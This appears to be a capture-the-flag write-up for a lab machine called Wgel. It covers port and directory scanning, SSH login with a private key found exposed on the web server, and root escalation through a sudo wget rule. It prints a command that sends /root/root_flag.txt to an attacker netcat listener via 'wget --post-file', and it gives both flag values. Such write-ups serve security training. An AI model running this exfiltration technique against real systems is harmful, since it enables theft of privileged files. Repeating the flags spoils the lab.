# WGEL
----
### Port Scanning
```sh
└─$ sudo nmap -sS -sV -O -oA exploit wgel >> ports.txt
                                                                                                                                                                        
└─$ cat ports.txt                                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 18:02 EDT
Nmap scan report for wgel (10.10.202.12)
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))


└─$ sudo nmap -A -p 22,80 wgel >> aggresive.txt

- Nothing Important

```

### Directory Enumeration
```sh
└─$ gobuster dir -u http://wgel -w /usr/share/wordlists/dirb/common.txt -o directory.txt

/.hta                 (Status: 403) [Size: 269]
/.htaccess            (Status: 403) [Size: 269]
/.htpasswd            (Status: 403) [Size: 269]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 269]
/sitemap              (Status: 301) [Size: 298] [--> http://wgel/sitemap/]

└─$ gobuster dir -u http://wgel/sitemap/ -w /usr/share/wordlists/dirb/common.txt -o directory.txt
/.ssh                 (Status: 301) [Size: 303] [--> http://wgel/sitemap/.ssh/]


```

### Post Directory Enum
- [This is a website Link](http://10.10.202.12/sitemap/)
- We can find that there is a website here
- If we go to (http://wgel/sitemap/.ssh/) we can find a id_rsa Encrypting key by this we can get into the ssh

![alt text](image.png)

![alt text](image-1.png)
- `Jessie` is our target name for ssh login


### SSH login
```sh
jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6

```

> ## user.txt : `057c67131c3d5e42dd5cd3075b198ff6`

## Privilege Escalation
```sh
jessie@CorpOne:~/Documents$ id
uid=1000(jessie) gid=1000(jessie) groups=1000(jessie),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget


```

- [MyCheatSheet](https://github.com/Ruhanyat-994/myCTF/blob/master/THM-CTF/TIPS/CTF-cheatSheet.md)

```sh
jessie@CorpOne:~/Documents$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.17.78.135:4444
--2024-08-04 01:32:45--  http://10.17.78.135:4444/
Connecting to 10.17.78.135:4444... connected.
HTTP request sent, awaiting response... 


```
```sh
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.17.78.135] from (UNKNOWN) [10.10.202.12] 42412
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.17.78.135:4444
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d

```

> ## root.txt: `b1b968b37519ad1daa6408188649263d`

----

# PWNED!!!